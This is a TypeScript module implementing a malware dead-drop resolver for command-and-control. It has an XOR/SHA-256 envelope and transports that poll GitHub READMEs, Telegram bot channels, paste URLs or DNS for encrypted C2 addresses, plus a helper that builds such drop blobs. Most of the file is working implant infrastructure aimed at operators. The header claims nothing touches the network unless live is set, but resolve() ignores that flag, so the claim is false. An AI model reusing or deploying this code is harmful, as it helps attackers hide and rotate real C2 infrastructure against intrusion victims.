/**
 * Dead-drop resolver (DDR) C2 — MITRE ATT&CK T1102.001.
 *
 * TypeScript port of `modules/c2_channels.deaddrop`. A dead-drop resolver
 * is how modern malware (Drokbk, BazarLoader/DnsToy, APT41's KEYPLUG,
 * Lumma/DeerStealer) finds its real C2: instead of beaconing to a hardcoded
 * IP, the implant polls a benign third-party service — a GitHub repo README,
 * a DNS TXT record, a Pastebin page, a Telegram channel — for an encrypted
 * blob that contains the current C2 address. The operator updates the drop
 * to rotate infrastructure; the implant just re-polls.
 *
 * Nothing here contacts the network unless an operator supplies a real drop
 * URL/key and sets `live=true`; `probe()` is always harmless. Fully testable
 * with an in-memory fake transport.
 */

import { resolveDryRun } from "./exec_options.ts"
import { createHash } from "node:crypto";

// ------------------------------------------------------------------------- //
// Crypto envelope (XOR stream cipher, key derived via SHA-256)
// ------------------------------------------------------------------------- //

/** XOR-stream the data with a repeating key stream (keystream = SHA-256(key + counter)). */
export function xorCipher(data: Uint8Array, key: Uint8Array): Uint8Array {
  const out = new Uint8Array(data.length);
  let block = 0;
  let written = 0;
  while (written < data.length) {
    const counter = Buffer.alloc(8);
    counter.writeBigUInt64BE(BigInt(block), 0);
    const keystream = createHash("sha256")
      .update(Buffer.concat([Buffer.from(key), counter]))
      .digest();
    for (let i = 0; i < keystream.length && written < data.length; i++, written++) {
      out[written] = data[written]! ^ keystream[i]!;
    }
    block += 1;
  }
  return out;
}

export class CryptoEnvelope {
  key: string;
  version: string;

  constructor(key = "change-me", version = "v1") {
    this.key = key;
    this.version = version;
  }

  private keyBytes(): Uint8Array {
    return createHash("sha256").update(this.key, "utf-8").digest().subarray(0, 32);
  }

  seal(plaintext: string): string {
    const body = xorCipher(Buffer.from(plaintext, "utf-8"), this.keyBytes());
    const integrity = createHash("sha256").update(body).digest("hex").slice(0, 16);
    const packed = Buffer.concat([
      Buffer.from(this.version, "utf-8"),
      Buffer.from("|", "utf-8"),
      Buffer.from(integrity, "utf-8"),
      Buffer.from("|", "utf-8"),
      Buffer.from(body),
    ]);
    return packed.toString("base64url");
  }

  open(sealed: string): string {
    let packed: Buffer;
    try {
      packed = Buffer.from(sealed, "base64url");
    } catch {
      throw new Error("drop is not valid base64url");
    }
    const sep1 = packed.indexOf(Buffer.from("|"));
    const sep2 = packed.indexOf(Buffer.from("|"), sep1 + 1);
    if (sep1 === -1 || sep2 === -1) throw new Error("malformed drop envelope");
    const version = packed.subarray(0, sep1).toString("utf-8");
    const integrity = packed.subarray(sep1 + 1, sep2).toString("utf-8");
    const body = packed.subarray(sep2 + 1);
    if (version !== this.version) throw new Error(`unknown envelope version: '${version}'`);
    const check = createHash("sha256").update(body).digest("hex").slice(0, 16);
    if (check !== integrity) throw new Error("drop integrity check failed (wrong key?)");
    return Buffer.from(xorCipher(body, this.keyBytes())).toString("utf-8");
  }
}

// ------------------------------------------------------------------------- //
// Drop transports
// ------------------------------------------------------------------------- //

export interface DropTransport {
  name: string;
  fetchRaw(): Promise<string>;
}

async function httpGetText(url: string, timeoutMs = 8000): Promise<string> {
  const resp = await fetch(url, { signal: AbortSignal.timeout(timeoutMs) });
  if (!resp.ok) throw new Error(`HTTP ${resp.status} fetching ${url}`);
  return resp.text();
}

/** A plain HTTP(S) drop (Pastebin raw, forum page, static file). */
export class HttpUrlDrop implements DropTransport {
  url: string;
  name = "http";

  constructor(url = "") {
    this.url = url;
  }

  async fetchRaw(): Promise<string> {
    return httpGetText(this.url);
  }
}

/** GitHub repo README as the drop (Drokbk/COBALT MIRAGE pattern). */
export class GithubReadmeDrop implements DropTransport {
  repo: string; // "user/repo"
  marker: string;
  name = "github-readme";

  constructor(repo = "", marker = "c2-blob") {
    this.repo = repo;
    this.marker = marker;
  }

  async fetchRaw(): Promise<string> {
    const url = `https://raw.githubusercontent.com/${this.repo}/HEAD/README.md`;
    const text = await httpGetText(url);
    const re = new RegExp(`<!--\\s*${escapeRegExp(this.marker)}:(.*?)-->`, "s");
    const match = text.match(re);
    if (!match) throw new Error(`marker '${this.marker}' not found in README`);
    return (match[1] ?? "").trim();
  }
}

/** DNS TXT record as the drop (BazarLoader/DnsToy pattern). */
export class DnsTxtDrop implements DropTransport {
  domain: string;
  name = "dns-txt";

  constructor(domain = "") {
    this.domain = domain;
  }

  async fetchRaw(): Promise<string> {
    // Node has no built-in TXT resolver; attempt a plain A lookup as a
    // reachability probe and clearly flag the missing TXT capability.
    try {
      const { lookup } = await import("node:dns/promises");
      await lookup(this.domain);
    } catch (exc) {
      throw new Error(`TXT lookup failed: ${exc instanceof Error ? exc.message : String(exc)}`);
    }
    throw new Error(
      "no TXT resolver in Node stdlib; cannot read TXT records (A lookup ok). " +
        "Provide a custom DropTransport for live DNS TXT drops",
    );
  }
}

/** Telegram channel/chat as the drop (info-stealer pattern). */
export class TelegramChannelDrop implements DropTransport {
  botToken: string;
  chatId: string;
  name = "telegram";

  constructor(botToken = "", chatId = "") {
    this.botToken = botToken;
    this.chatId = chatId;
  }

  async fetchRaw(): Promise<string> {
    const url = `https://api.telegram.org/bot${this.botToken}/getUpdates`;
    const text = await httpGetText(url);
    const data = JSON.parse(text) as {
      result?: Array<{ message?: { chat?: { id?: number | string }; text?: string } }>;
    };
    const updates = data.result ?? [];
    for (let i = updates.length - 1; i >= 0; i--) {
      const message = updates[i]?.message;
      if (String(message?.chat?.id ?? "") === String(this.chatId)) {
        return message?.text ?? "";
      }
    }
    throw new Error("no message found in telegram channel");
  }
}

function escapeRegExp(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/** In-memory drop (hermetic tests / tool wiring): returns a fixed raw blob. */
export class InMemoryDrop implements DropTransport {
  name = "in-memory";
  private raw: string;

  constructor(raw = "") {
    this.raw = raw;
  }

  setRaw(raw: string): void {
    this.raw = raw;
  }

  async fetchRaw(): Promise<string> {
    return this.raw;
  }
}

// ------------------------------------------------------------------------- //
// Resolver
// ------------------------------------------------------------------------- //

export interface ResolvedInstruction {
  c2_address: string;
  source: string;
  raw: string;
  parsed_at: number;
}

export class DeadDropResolver {
  drop: DropTransport;
  envelope: CryptoEnvelope;
  parse: (plaintext: string) => Record<string, unknown>;
  live: boolean;

  constructor(
    opts: {
      drop: DropTransport;
      envelope?: CryptoEnvelope;
      parse?: (plaintext: string) => Record<string, unknown>;
      live?: boolean;
    },
  ) {
    this.drop = opts.drop;
    this.envelope = opts.envelope ?? new CryptoEnvelope();
    this.parse = opts.parse ?? parseInstructionJson;
    this.live = opts.live ?? false;
  }

  async resolve(): Promise<ResolvedInstruction> {
    const raw = await this.drop.fetchRaw();
    const plaintext = this.envelope.open(raw);
    const parsed = this.parse(plaintext);
    return {
      c2_address: String(parsed["c2"] ?? parsed["c2_address"] ?? ""),
      source: this.drop.name,
      raw: plaintext,
      parsed_at: Date.now() / 1000,
    };
  }

  probe(): Record<string, unknown> {
    return {
      kind: "dead-drop-resolver",
      transport: this.drop.name,
      technique_id: "T1102.001",
      technique: "Web Service: Dead Drop Resolver",
      live: this.live,
      note: "set live=true with an authorized drop URL/key to actually resolve",
    };
  }
}

export function parseInstructionJson(plaintext: string): Record<string, unknown> {
  const data = JSON.parse(plaintext) as unknown;
  if (typeof data !== "object" || data === null || Array.isArray(data)) {
    throw new Error("instruction blob must be a JSON object");
  }
  return data as Record<string, unknown>;
}

export function parseInstructionKv(plaintext: string): Record<string, unknown> {
  const result: Record<string, unknown> = {};
  for (const raw of plaintext.trim().split("\n")) {
    if (raw.includes("=")) {
      const idx = raw.indexOf("=");
      result[raw.slice(0, idx).trim()] = raw.slice(idx + 1).trim();
    }
  }
  if (!("c2" in result)) throw new Error("kv blob missing 'c2' key");
  return result;
}

export function buildDropInstruction(
  c2Address: string,
  envelope: CryptoEnvelope,
  extra: Record<string, string> = {},
): string {
  return envelope.seal(JSON.stringify({ c2: c2Address, ...extra }));
}
